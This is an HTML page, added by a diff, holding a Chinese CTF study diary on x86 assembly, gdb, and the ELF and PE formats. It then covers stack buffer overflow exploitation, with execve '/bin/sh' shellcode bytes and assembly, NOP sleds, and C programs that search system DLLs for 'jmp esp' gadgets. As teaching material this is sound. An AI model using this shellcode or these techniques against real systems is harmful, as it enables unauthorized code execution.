@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="1学习日记1  汇编基础（x86） 内存  寄存器：    普通: EAX, EBX, ECX, EDX        ESI, EDI, EBP, ESP   段寄存器:      CS, DS, ES, FS, GS, SS 特殊寄存器:      EIP, EFLAGS   指令:    push,pop add&#x2F;sub&#x2F;mul&#x2F;div,      xor, or mov,      lea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="别碰我的柠檬">
+<meta property="og:url" content="http://example.com/2021/06/25/ctfpwn1/index.html">
+<meta property="og:site_name" content="别碰我的柠檬">
+<meta property="og:description" content="1学习日记1  汇编基础（x86） 内存  寄存器：    普通: EAX, EBX, ECX, EDX        ESI, EDI, EBP, ESP   段寄存器:      CS, DS, ES, FS, GS, SS 特殊寄存器:      EIP, EFLAGS   指令:    push,pop add&#x2F;sub&#x2F;mul&#x2F;div,      xor, or mov,      lea">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625155650349.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625155751637.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625155828057.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625155850731.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625161620552.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625161817046.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625161921562.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625164034717.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625164102489.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625164339018.png">
+<meta property="og:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625170722345.png">
+<meta property="article:published_time" content="2021-06-25T07:50:05.885Z">
+<meta property="article:modified_time" content="2021-06-25T09:09:35.850Z">
+<meta property="article:author" content="FBC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/86153/AppData/Roaming/Typora/typora-user-images/image-20210625155650349.png">
+
+
+<link rel="canonical" href="http://example.com/2021/06/25/ctfpwn1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/06/25/ctfpwn1/","path":"2021/06/25/ctfpwn1/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | 别碰我的柠檬</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">别碰我的柠檬</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">芒果</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88x86%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">汇编基础（x86）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-number">2.</span> <span class="nav-text">栈上的数据</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">FBC</p>
+  <div class="site-description" itemprop="description">仅供学习</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/25/ctfpwn1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="FBC">
+      <meta itemprop="description" content="仅供学习">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="别碰我的柠檬">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-06-25 15:50:05 / Modified: 17:09:35" itemprop="dateCreated datePublished" datetime="2021-06-25T15:50:05+08:00">2021-06-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">学习日记1</span><br></pre></td></tr></table></figure>
+
+<h3 id="汇编基础（x86）"><a href="#汇编基础（x86）" class="headerlink" title="汇编基础（x86）"></a>汇编基础（x86）</h3><ul>
+<li><p>内存</p>
+</li>
+<li><p>寄存器： </p>
+</li>
+<li><ol>
+<li>普通: EAX, EBX, ECX, EDX<pre><code>        ESI, EDI, EBP, ESP
+</code></pre>
+</li>
+<li>段寄存器:      CS, DS, ES, FS, GS, SS</li>
+<li>特殊寄存器:      EIP, EFLAGS</li>
+</ol>
+</li>
+<li><p>指令: </p>
+</li>
+<li><ol>
+<li>push,pop</li>
+<li>add/sub/mul/div,      xor, or</li>
+<li>mov,      lea,</li>
+<li>test,      cmp, jmp, call, ret</li>
+</ol>
+</li>
+</ul>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155650349.png" style="zoom:25%;" />
+
+<h3 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h3><p>EIP存储的是下一条要执行的指令的地址，所以若EIP的值被修改为我们期望的地址，函数运行到ret时，程序将会跳到修改后的地址运行指令。根据上面来看，在进入函数时，通常栈上的数据是这样的。可以看出，ESP永远指向栈顶的位置，而EBP则永远指向当前函数空间的栈底。</p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155751637.png" style="zoom:40%;" />
+
+<p><strong>IA32寄存器</strong></p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155828057.png" style="zoom:25%;" />
+
+<p><strong>x86-64寄存器</strong></p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155850731.png" style="zoom:25%;" />
+
+<p><strong>关键寄存器</strong></p>
+<ul>
+<li><p>EIP： </p>
+</li>
+<li><ul>
+<li>指向下一条要被执行的指令，cpu将从eip指向的地址获取指令</li>
+<li>不能被直接覆写</li>
+</ul>
+</li>
+<li><p>ESP： </p>
+</li>
+<li><ul>
+<li>指向栈顶</li>
+<li>PUSH/POP操作都基于操作ESP</li>
+</ul>
+</li>
+</ul>
+<p><strong>基本指令</strong></p>
+<ul>
+<li><p>操作栈 </p>
+</li>
+<li><ul>
+<li>push</li>
+<li>pop</li>
+</ul>
+</li>
+<li><p>运算操作 </p>
+</li>
+<li><ul>
+<li>add/sub/mul/div</li>
+<li>xor/or</li>
+</ul>
+</li>
+<li><p>内存/寄存器操作 </p>
+</li>
+<li><ul>
+<li>mov/lea</li>
+</ul>
+</li>
+<li><p>条件执行 </p>
+</li>
+<li><ul>
+<li>test，cmp，jmp</li>
+<li>jz，jnz，jg，ja</li>
+</ul>
+</li>
+<li><p>子程序调用 </p>
+</li>
+<li><ul>
+<li>call，ret</li>
+</ul>
+</li>
+</ul>
+<p><strong>重要指令</strong></p>
+<ul>
+<li><p>call     <function>:执行目标函数</p>
+</li>
+<li><ul>
+<li>把下一条指令（返回地址）压栈</li>
+<li>跳转到目标函数</li>
+<li>应该在函数调用完之后执行下一条指令</li>
+</ul>
+</li>
+<li><p>ret：返回调用</p>
+</li>
+<li><ul>
+<li>弹出（pop）栈顶，得到返回地址</li>
+<li>跳转到跳转到返回地址（通过改变EIP）</li>
+<li>应该跳转到调用方的下一条指令</li>
+</ul>
+</li>
+</ul>
+<p><strong>函数调用时发生了什么</strong>(x86)</p>
+<ol>
+<li>传递参数</li>
+<li>call     函数地址（push eip，jmp 被调函数地址）</li>
+<li>ebp入栈，当前esp复制到ebp，esp减去一个数值，形成该函数的栈空间</li>
+<li>初始化局部变量（自动变量）</li>
+<li>运行函数指令</li>
+<li>返回值传递</li>
+<li>pop ebp</li>
+<li>ret（pop     eip）</li>
+</ol>
+<p>这里没有提到平衡栈帧的操作，实际上根据调用约定的不同，这个操作会在调用者或被调用者两个地方进行。</p>
+<p><strong>Intel 和 AT&amp;T语法</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Intel Syntax</strong></th>
+<th><strong>AT&amp;T Syntax</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mov  eax,1</td>
+<td>movl $1,  %eax</td>
+</tr>
+<tr>
+<td>mov ebx,  0ffh</td>
+<td>movl  $0xff, %ebx</td>
+</tr>
+<tr>
+<td>int 80h</td>
+<td>int  $0x80</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sum: </span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    mov eax, [ebp+12]</span><br><span class="line">    add eax, [ebp+8]</span><br><span class="line">    pop ebp</span><br><span class="line">    retn</span><br><span class="line">sum:</span><br><span class="line">    pushl %ebp</span><br><span class="line">    movl %esp,%ebp</span><br><span class="line">    movl 12(%ebp),%eax</span><br><span class="line">    addl 8(%ebp),%eax</span><br><span class="line">    popl %ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong>Intel Syntax</strong></th>
+<th><strong>AT&amp;T Syntax</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AT&amp;T 语法先写源操作数，再写目标操作数</td>
+<td>Intel  语法先写目标操作数，再写源操作数：</td>
+</tr>
+<tr>
+<td>AT&amp;T 语法将操作数的大小表示在指令的后缀中（b、w、l）</td>
+<td>Intel  语法将操作数的大小表示在操作数的前缀中（BYTE PTR、WORD PTR、DWORD PTR）</td>
+</tr>
+<tr>
+<td>AT&amp;T 语法总体上是offset(base, index, width)的格式</td>
+<td>Intel  语法总体上是[INDEX * WIDTH + BASE + OFFSET]的格式</td>
+</tr>
+<tr>
+<td>AT&amp;T 语法用前缀表示数制（0x、0、0b）</td>
+<td>Intel  语法用后缀表示数制（h、o、b）</td>
+</tr>
+<tr>
+<td>AT&amp;T 语法要在常数前加 $、在寄存器名前加 % 符号</td>
+<td>Intel  语法没有相应的东西要加</td>
+</tr>
+</tbody></table>
+<p><strong>gdb</strong></p>
+<p><strong>gdb指令（短/长）</strong></p>
+<ul>
+<li><p>r/run, c/continue</p>
+</li>
+<li><p>s/step, n/next</p>
+</li>
+<li><p>si, ni</p>
+</li>
+<li><p>b/break</p>
+</li>
+<li><p>bt/backtrace</p>
+</li>
+<li><p>x, print, display,     info</p>
+</li>
+<li><p>…</p>
+</li>
+<li><p>Breakpoints: stops     when executed </p>
+</li>
+<li><ul>
+<li>break function</li>
+<li>break *addr</li>
+<li>info break</li>
+<li>clear function</li>
+<li>delete/enable/disable      [n]</li>
+</ul>
+</li>
+<li><p>Watchpoints: stops     when values changed </p>
+</li>
+<li><ul>
+<li>watch expr</li>
+<li>info watch</li>
+</ul>
+</li>
+<li><p>continue</p>
+</li>
+<li><p>step：     向前移动一步（语句），在调用函数时进入被调用者</p>
+</li>
+<li><p>stepi：    向前移动一步（指令），在调用函数时进入被调用者</p>
+</li>
+<li><p>next：     向前移动一步（语句），在调用函数时跳过被调用者</p>
+</li>
+<li><p>nexti：    向前移动一步（指令），在调用函数时跳过被调用者</p>
+</li>
+<li><p>print [/f] expr</p>
+</li>
+<li><ol>
+<li>x      十六进制</li>
+<li>d      有符号十进制</li>
+<li>u      无符号十进制</li>
+<li>o      八进制</li>
+<li>t       二进制</li>
+<li>a      地址</li>
+<li>c      character</li>
+<li>f       浮点数</li>
+</ol>
+</li>
+<li><p>info reg [rn]</p>
+</li>
+<li><p>Display </p>
+</li>
+<li><ul>
+<li><p>x [/Nuf] expr </p>
+</li>
+<li><ul>
+<li><p>N count of units       to display</p>
+</li>
+<li><p>u unit size </p>
+</li>
+<li><ul>
+<li>b 字节</li>
+<li>h 双字</li>
+<li>w 四字</li>
+<li>g 八字节</li>
+</ul>
+</li>
+<li><p>f printing format       </p>
+</li>
+<li><ul>
+<li>s 空字符结束的字符串</li>
+<li>i 汇编指令</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>disassem [addr]</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>链接过程</strong></p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625161620552.png" alt="image-20210625161620552" style="zoom:20%;" />
+
+<p><strong>文件格式</strong></p>
+<ul>
+<li><p>文件类型识别 </p>
+</li>
+<li><ul>
+<li>file命令</li>
+<li>文件magic</li>
+<li>binwalk项目，参考ReFirmLabs/binwalk</li>
+</ul>
+</li>
+<li><p>文件检查 </p>
+</li>
+<li><ul>
+<li>md5sum，校验文件md5值</li>
+<li>virustotal,识别恶意代码</li>
+<li>fuzzy hashing: ssdeep fuzzywuzzy</li>
+<li>diff/patch</li>
+</ul>
+</li>
+<li><p>ELF/PE/Mach-O </p>
+</li>
+<li><ul>
+<li>readelf命令</li>
+<li>peview/loard-pe/等</li>
+</ul>
+</li>
+</ul>
+<p><strong>ELF文件格式</strong></p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625161817046.png" alt="image-20210625161817046" style="zoom: 33%;" />
+
+<p><strong>PE文件格式</strong></p>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625161921562.png" alt="image-20210625161921562" style="zoom:33%;" />
+
+<p><strong>如何利用缓冲区溢出</strong></p>
+<ul>
+<li><p>覆盖局部变量 </p>
+</li>
+<li><ul>
+<li>尤其是函数指针</li>
+</ul>
+</li>
+<li><p>覆盖错误句柄</p>
+</li>
+<li><p>覆盖存储在栈帧上的指针</p>
+</li>
+<li><p>覆盖返回地址 </p>
+</li>
+<li><ul>
+<li>当函数返回时改变EIP</li>
+</ul>
+</li>
+</ul>
+<p><strong>shellcode开发</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>],name,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>如何利用缓冲区溢出</strong></p>
+<p>把指令和数据改为字符串形式</p>
+<p>“\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x46<br> \x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c<br> xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\x<br> ff\xff\xff/bin/sh”</p>
+<p><strong>shellcode开发</strong></p>
+<p>编写汇编程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al,0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>编译并获取机器码</p>
+<p>char shellcode[]=”\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80”;</p>
+<ul>
+<li><p>不是所有的字符都能作为shellcode     </p>
+</li>
+<li><ul>
+<li>gets():遇到换行符就停止</li>
+<li>strcpy():遇到NULL就停止</li>
+<li>…</li>
+</ul>
+</li>
+<li><p>shellcode需要做相应的调整 </p>
+</li>
+<li><ul>
+<li>删除 \x00,空格，换行符…</li>
+<li>删除不能被打印的字符</li>
+</ul>
+</li>
+</ul>
+<p><strong>基础栈溢出</strong></p>
+<ul>
+<li><p>覆盖返回地址，shellcode位与栈上     </p>
+</li>
+<li><ul>
+<li>问题：攻击者如何精确定位shellcode的地址</li>
+<li>解决：NOP slide</li>
+</ul>
+</li>
+<li><p>猜测大概的栈地址</p>
+</li>
+<li><p>在shellcode前面填充大量NOPs</p>
+</li>
+</ul>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625164034717.png" alt="image-20210625164034717" style="zoom:35%;" />
+
+<ul>
+<li><p>覆盖返回地址，shellcode位与栈上     </p>
+</li>
+<li><ul>
+<li>问题：如果buffer长度小于shellcode长度</li>
+<li>解决：RNS模式</li>
+</ul>
+</li>
+<li><p>把shellcode放在内存的高位上（调用者的栈帧）</p>
+</li>
+</ul>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625164102489.png" alt="image-20210625164102489" style="zoom:33%;" />
+
+<p><strong>关于字符串的危险库函数</strong></p>
+<ul>
+<li>strcpy (char *dest,     const char *src)</li>
+<li>strcat (char *dest,     const char *src)</li>
+<li>gets (char *s)</li>
+<li>scanf ( const char     *format, … )</li>
+<li>…</li>
+</ul>
+<p><strong>基础栈溢出的问题</strong></p>
+<ul>
+<li>依赖缓冲区/栈的地址，栈的地址会根据平台和每次运行而改变。</li>
+<li>如何构造一个适用于大多数平台的攻击？</li>
+</ul>
+<p><strong>jmp esp</strong></p>
+<ul>
+<li>寻找指令”jmp     esp”的地址</li>
+<li>不需要知道shellcode的地址</li>
+</ul>
+<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625164339018.png" alt="image-20210625164339018" style="zoom:33%;" />
+
+<p><strong>到哪里寻找 “jmp esp”</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">char</span>**,<span class="keyword">char</span>**)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BYTE* pbyte;</span><br><span class="line">	<span class="keyword">int</span> nPos=<span class="number">0</span>,nAddr=<span class="number">0</span>;</span><br><span class="line">	HINSTANCE hHinst=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">bool</span> bTips=<span class="literal">true</span>;</span><br><span class="line">	hHinst=LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!hHinst) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	pbyte=(BYTE*)hHinst;</span><br><span class="line">	<span class="keyword">while</span>(bTips)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(pbyte[nPos]==<span class="number">0xff</span> &amp;&amp; pbyte[nPos+<span class="number">1</span>]==<span class="number">0xe4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			nAddr=(<span class="keyword">int</span>)pbyte+nPos;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;address is 0x%x\n&quot;</span>,nAddr);</span><br><span class="line">			bTips=<span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           nPos++;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(hHinst!=<span class="literal">NULL</span>) FreeLibrary(hHinst);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nRetCode=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> we_load_it=<span class="literal">false</span>;</span><br><span class="line">HINSTANCE h;</span><br><span class="line">TCHAR dllname[]=_T(<span class="string">&quot;ntdll&quot;</span>);       </span><br><span class="line">h=<span class="built_in">GetModuleHandle</span>(dllname);</span><br><span class="line"><span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line">  &#123;h=<span class="built_in">LoadLibrary</span>(dllname);</span><br><span class="line"><span class="keyword">if</span>(h==<span class="literal">NULL</span>)</span><br><span class="line"> &#123;cout&lt;&lt;<span class="string">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">we_load_it=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">BYTE* ptr=(BYTE*)h;</span><br><span class="line"><span class="keyword">bool</span> done=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> y=<span class="number">0</span>;!done;y++)</span><br><span class="line">&#123;<span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ptr[y]==<span class="number">0xFF</span>&amp;&amp;ptr[y+<span class="number">1</span>]==<span class="number">0xE4</span>)</span><br><span class="line">&#123;<span class="keyword">int</span> pos=(<span class="keyword">int</span>)ptr+y;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;&#125;&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span>(...)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class="string">&quot;MEMORY REACHED&quot;</span>&lt;&lt;endl;</span><br><span class="line">done=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(we_load_it)</span><br><span class="line"><span class="built_in">FreeLibrary</span>(h);</span><br><span class="line"><span class="keyword">return</span> nRetCode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
